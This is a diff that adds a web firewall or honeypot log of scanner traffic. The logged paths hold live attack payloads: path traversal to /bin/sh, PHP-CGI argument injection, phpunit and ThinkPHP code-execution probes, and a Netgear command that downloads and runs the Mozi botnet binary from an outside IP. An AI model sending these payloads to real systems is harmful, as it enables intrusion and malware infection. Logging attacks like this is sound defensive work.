@@ -1,0 +1,1164 @@
+{"time": "2026-08-03 11:30:52", "ip": "223.188.73.106", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 11:31:13", "ip": "223.188.73.106", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 11:31:28", "ip": "223.188.73.106", "path": "/etc/passwd", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 11:31:28", "ip": "223.188.73.106", "path": "/etc/passwd", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-03 11:31:29", "ip": "223.188.73.106", "path": "/etc/passwd", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-03 11:31:30", "ip": "223.188.73.106", "path": "/etc/passwd", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:30", "ip": "223.188.73.106", "path": "/etc/passwd", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:42", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:42", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:42", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:43", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:43", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:43", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:43", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:43", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:44", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:44", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:44", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:44", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:44", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:45", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:46", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:46", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:46", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:46", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:46", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:31:47", "ip": "223.188.73.106", "path": "/", "action": "banned_ip_blocked"}
+{"time": "2026-08-03 11:35:52", "ip": "52.66.23.197", "path": "/etc/passwd", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 14:56:07", "ip": "64.89.163.110", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 14:57:22", "ip": "64.89.163.110", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 15:21:58", "ip": "82.27.247.101", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 15:21:59", "ip": "82.27.247.101", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-03 15:59:41", "ip": "8.219.132.68", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 15:59:42", "ip": "8.219.132.68", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 16:02:29", "ip": "150.107.38.161", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 16:02:36", "ip": "150.107.38.161", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-03 16:11:15", "ip": "150.107.38.161", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-03 16:28:04", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 17:10:47", "ip": "54.172.52.31", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 17:34:38", "ip": "104.239.73.246", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 17:34:39", "ip": "104.239.73.246", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-03 17:49:03", "ip": "20.65.194.77", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 18:31:04", "ip": "205.210.31.32", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 18:53:14", "ip": "66.132.172.206", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 18:53:31", "ip": "66.132.172.206", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-03 18:54:37", "ip": "66.132.172.206", "path": "/login", "action": "allowed"}
+{"time": "2026-08-03 18:54:48", "ip": "66.132.172.206", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-03 18:54:51", "ip": "66.132.172.206", "path": "/xxadmwrksk82vhrf", "action": "allowed"}
+{"time": "2026-08-03 18:54:59", "ip": "66.132.172.206", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-03 19:08:40", "ip": "124.29.214.60", "path": "/HNAP1/", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-03 20:11:38", "ip": "136.0.109.240", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 20:11:39", "ip": "136.0.109.240", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-03 21:41:46", "ip": "205.210.31.32", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 21:51:03", "ip": "82.21.244.45", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 21:51:04", "ip": "82.21.244.45", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-03 21:53:43", "ip": "161.35.190.246", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 22:47:23", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 22:51:01", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-03 23:13:39", "ip": "82.23.235.89", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-03 23:13:40", "ip": "82.23.235.89", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 00:15:52", "ip": "209.99.185.239", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 00:15:58", "ip": "209.99.185.239", "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 00:16:04", "ip": "209.99.185.239", "path": "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "allowed"}
+{"time": "2026-08-04 00:16:05", "ip": "209.99.185.239", "path": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 00:16:11", "ip": "209.99.185.239", "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:17", "ip": "209.99.185.239", "path": "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:23", "ip": "209.99.185.239", "path": "/vendor/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:29", "ip": "209.99.185.239", "path": "/vendor/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:35", "ip": "209.99.185.239", "path": "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:41", "ip": "209.99.185.239", "path": "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:47", "ip": "209.99.185.239", "path": "/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:53", "ip": "209.99.185.239", "path": "/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:16:59", "ip": "209.99.185.239", "path": "/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:05", "ip": "209.99.185.239", "path": "/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:11", "ip": "209.99.185.239", "path": "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:17", "ip": "209.99.185.239", "path": "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:23", "ip": "209.99.185.239", "path": "/lib/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:29", "ip": "209.99.185.239", "path": "/lib/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:36", "ip": "209.99.185.239", "path": "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:41", "ip": "209.99.185.239", "path": "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:47", "ip": "209.99.185.239", "path": "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:53", "ip": "209.99.185.239", "path": "/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:17:59", "ip": "209.99.185.239", "path": "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:05", "ip": "209.99.185.239", "path": "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:11", "ip": "209.99.185.239", "path": "/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:17", "ip": "209.99.185.239", "path": "/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:23", "ip": "209.99.185.239", "path": "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:29", "ip": "209.99.185.239", "path": "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:35", "ip": "209.99.185.239", "path": "/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:41", "ip": "209.99.185.239", "path": "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:47", "ip": "209.99.185.239", "path": "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:53", "ip": "209.99.185.239", "path": "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:18:59", "ip": "209.99.185.239", "path": "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:05", "ip": "209.99.185.239", "path": "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:11", "ip": "209.99.185.239", "path": "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:17", "ip": "209.99.185.239", "path": "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:23", "ip": "209.99.185.239", "path": "/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:29", "ip": "209.99.185.239", "path": "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:35", "ip": "209.99.185.239", "path": "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:41", "ip": "209.99.185.239", "path": "/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:47", "ip": "209.99.185.239", "path": "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 00:19:53", "ip": "209.99.185.239", "path": "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", "action": "allowed"}
+{"time": "2026-08-04 00:19:59", "ip": "209.99.185.239", "path": "/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", "action": "allowed"}
+{"time": "2026-08-04 00:20:00", "ip": "209.99.185.239", "path": "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 00:20:01", "ip": "209.99.185.239", "path": "/index.php?lang=../../../../../../../../tmp/index1", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 00:20:07", "ip": "209.99.185.239", "path": "/containers/json", "action": "allowed"}
+{"time": "2026-08-04 00:31:32", "ip": "147.185.132.168", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 00:31:48", "ip": "43.128.81.242", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 00:31:54", "ip": "43.128.81.242", "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 00:32:02", "ip": "43.128.81.242", "path": "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "allowed"}
+{"time": "2026-08-04 00:32:03", "ip": "43.128.81.242", "path": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 01:40:05", "ip": "124.29.214.157", "path": "/boaform/admin/formLogin?username=adminisp&psd=adminisp", "action": "allowed"}
+{"time": "2026-08-04 02:06:06", "ip": "51.103.152.96", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-04 02:08:31", "ip": "51.103.152.96", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-04 02:14:14", "ip": "172.174.250.151", "path": "/druid/index.html", "action": "allowed"}
+{"time": "2026-08-04 02:38:28", "ip": "195.178.110.241", "path": "/.git/config", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 02:41:01", "ip": "64.227.74.36", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 02:41:06", "ip": "64.227.74.36", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 03:17:09", "ip": "104.239.38.180", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 03:17:10", "ip": "104.239.38.180", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 04:36:31", "ip": "5.224.64.230", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 04:36:36", "ip": "5.224.64.230", "path": "/TS/Api/home/util/Db/GetDataTable?sql=SELECT%201", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 04:46:51", "ip": "172.202.117.179", "path": "/developmentserver/metadatauploader", "action": "allowed"}
+{"time": "2026-08-04 05:02:57", "ip": "66.240.236.109", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 05:15:40", "ip": "139.135.59.88", "path": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.59.88:43198/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1", "action": "allowed"}
+{"time": "2026-08-04 05:21:20", "ip": "66.249.69.40", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-04 05:32:13", "ip": "195.172.150.74", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 05:32:14", "ip": "195.172.150.74", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 05:47:50", "ip": "184.105.139.68", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 05:51:08", "ip": "184.105.139.68", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 05:52:12", "ip": "184.105.139.68", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-04 06:18:28", "ip": "118.216.88.229", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 06:18:34", "ip": "118.216.88.229", "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 06:18:39", "ip": "118.216.88.229", "path": "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "allowed"}
+{"time": "2026-08-04 06:18:40", "ip": "118.216.88.229", "path": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 06:18:45", "ip": "118.216.88.229", "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:18:50", "ip": "118.216.88.229", "path": "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:18:56", "ip": "118.216.88.229", "path": "/vendor/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:01", "ip": "118.216.88.229", "path": "/vendor/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:07", "ip": "118.216.88.229", "path": "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:12", "ip": "118.216.88.229", "path": "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:18", "ip": "118.216.88.229", "path": "/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:23", "ip": "118.216.88.229", "path": "/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:28", "ip": "118.216.88.229", "path": "/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:34", "ip": "118.216.88.229", "path": "/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:39", "ip": "118.216.88.229", "path": "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:45", "ip": "118.216.88.229", "path": "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:50", "ip": "118.216.88.229", "path": "/lib/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:19:56", "ip": "118.216.88.229", "path": "/lib/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:01", "ip": "118.216.88.229", "path": "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:06", "ip": "118.216.88.229", "path": "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:12", "ip": "118.216.88.229", "path": "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:18", "ip": "118.216.88.229", "path": "/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:25", "ip": "118.216.88.229", "path": "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:30", "ip": "118.216.88.229", "path": "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:36", "ip": "118.216.88.229", "path": "/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:41", "ip": "118.216.88.229", "path": "/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:46", "ip": "118.216.88.229", "path": "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:52", "ip": "118.216.88.229", "path": "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:20:57", "ip": "118.216.88.229", "path": "/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:03", "ip": "118.216.88.229", "path": "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:08", "ip": "118.216.88.229", "path": "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:13", "ip": "118.216.88.229", "path": "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:19", "ip": "118.216.88.229", "path": "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:24", "ip": "118.216.88.229", "path": "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:30", "ip": "118.216.88.229", "path": "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:35", "ip": "118.216.88.229", "path": "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:41", "ip": "118.216.88.229", "path": "/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:46", "ip": "118.216.88.229", "path": "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:51", "ip": "118.216.88.229", "path": "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:21:57", "ip": "118.216.88.229", "path": "/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:22:02", "ip": "118.216.88.229", "path": "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 06:22:08", "ip": "118.216.88.229", "path": "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", "action": "allowed"}
+{"time": "2026-08-04 06:22:13", "ip": "118.216.88.229", "path": "/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello", "action": "allowed"}
+{"time": "2026-08-04 06:22:13", "ip": "118.216.88.229", "path": "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 06:22:15", "ip": "118.216.88.229", "path": "/index.php?lang=../../../../../../../../tmp/index1", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 06:22:21", "ip": "118.216.88.229", "path": "/containers/json", "action": "allowed"}
+{"time": "2026-08-04 07:52:17", "ip": "66.132.195.124", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 07:52:25", "ip": "66.132.195.124", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 07:52:41", "ip": "66.132.195.124", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-04 07:52:53", "ip": "66.132.195.124", "path": "/favicon.ico", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-04 07:52:54", "ip": "66.132.195.124", "path": "/grp2j16_m2", "action": "allowed"}
+{"time": "2026-08-04 07:53:00", "ip": "66.132.195.124", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 07:57:58", "ip": "47.88.55.214", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 07:57:59", "ip": "47.88.55.214", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 08:29:21", "ip": "92.112.170.186", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 08:29:22", "ip": "92.112.170.186", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 09:36:22", "ip": "150.107.36.82", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 10:51:29", "ip": "82.24.212.221", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 10:51:30", "ip": "82.24.212.221", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 11:15:13", "ip": "125.42.212.6", "path": "/GponForm/diag_Form?images/", "action": "allowed"}
+{"time": "2026-08-04 11:44:48", "ip": "50.114.236.5", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 11:44:54", "ip": "50.114.236.5", "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh", "action": "allowed"}
+{"time": "2026-08-04 11:45:00", "ip": "50.114.236.5", "path": "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "allowed"}
+{"time": "2026-08-04 11:45:00", "ip": "50.114.236.5", "path": "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 11:45:06", "ip": "50.114.236.5", "path": "/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input", "action": "allowed"}
+{"time": "2026-08-04 11:45:12", "ip": "50.114.236.5", "path": "/test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input", "action": "allowed"}
+{"time": "2026-08-04 11:45:18", "ip": "50.114.236.5", "path": "/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input", "action": "allowed"}
+{"time": "2026-08-04 11:45:23", "ip": "50.114.236.5", "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:45:29", "ip": "50.114.236.5", "path": "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:45:35", "ip": "50.114.236.5", "path": "/vendor/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:45:40", "ip": "50.114.236.5", "path": "/vendor/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
